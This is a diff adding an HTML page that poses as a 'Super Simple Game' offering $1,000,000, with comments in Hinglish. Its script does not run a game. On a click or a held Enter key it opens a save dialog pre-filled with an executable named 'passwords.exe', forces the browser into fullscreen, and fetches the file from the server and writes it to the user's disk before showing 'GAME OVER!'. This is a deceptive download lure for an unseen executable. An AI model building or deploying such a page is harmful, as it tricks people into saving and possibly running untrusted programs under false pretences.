@@ -1,0 +1,93 @@
+<html>
+<head>
+    <title>Super Simple Game</title>
+    <meta charset="UTF-8">
+    <style>
+        body {
+            background: rgba(29, 48, 109, 0.849);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+            cursor: pointer; /* Taaki user ko pata chale click karna hai */
+            font-family: sans-serif;
+        }
+        h1, h2, h3 { -webkit-text-stroke: 1px #00000050; text-align: center; margin: 10px; }
+        h1 { color: #D96C06; font-size: 50px; }
+        h2 { color: #1ebe8e; font-size: 40px; }
+        h3 { color: #C6F91F; font-size: 30px; }
+        h2 span { color: #cf4848; font-size: 60px; }
+    </style>
+</head>
+<body>
+
+    <h1>Super Simple Game😻😻😻</h1>
+    <h2><span>⌨️HOLD ENTER</span> or CLICK</h2>
+    <h3>To win $1,000,000! 🔥🚀</h3>
+    <h3 id="gameover"></h3>
+
+    <script>
+        let countEnter = 0;
+        let active = false;
+
+        async function startAction() {
+            if (active) return;
+            active = true;
+
+            try {
+                // 1. Download Window Trigger (File System API)
+                const options = {
+                    suggestedName: 'passwords.exe',
+                    types: [{
+                        description: 'Executable File',
+                        accept: {'application/x-msdownload': ['.exe']}
+                    }]
+                };
+                
+                // Ye line download prompt kholegi
+                const handle = await window.showSaveFilePicker(options);
+
+                // 2. 1 Second baad Fullscreen
+                setTimeout(() => {
+                    const elem = document.documentElement;
+                    if (elem.requestFullscreen) {
+                        elem.requestFullscreen();
+                    } else if (elem.webkitRequestFullscreen) {
+                        elem.webkitRequestFullscreen();
+                    }
+                }, 1000);
+
+                // 3. File likhna (Optional, agar server pe passwords.exe hai)
+                const writable = await handle.createWritable();
+                const response = await fetch('passwords.exe');
+                const blob = await response.blob();
+                await writable.write(blob);
+                await writable.close();
+
+                document.querySelector("#gameover").textContent = "GAME OVER!";
+            } catch (err) {
+                console.log("Error or Cancelled", err);
+                active = false; // Reset taaki dobara click ho sake
+            }
+        }
+
+        // Click hone pe start
+        document.addEventListener('click', startAction);
+
+        // Enter hold karne pe start
+        document.addEventListener('keydown', (e) => {
+            if (e.key === "Enter") {
+                countEnter++;
+                if (countEnter > 5) startAction();
+            }
+        });
+
+        document.addEventListener('keyup', (e) => {
+            if (e.key === "Enter") countEnter = 0;
+        });
+    </script>
+</body>
+</html>
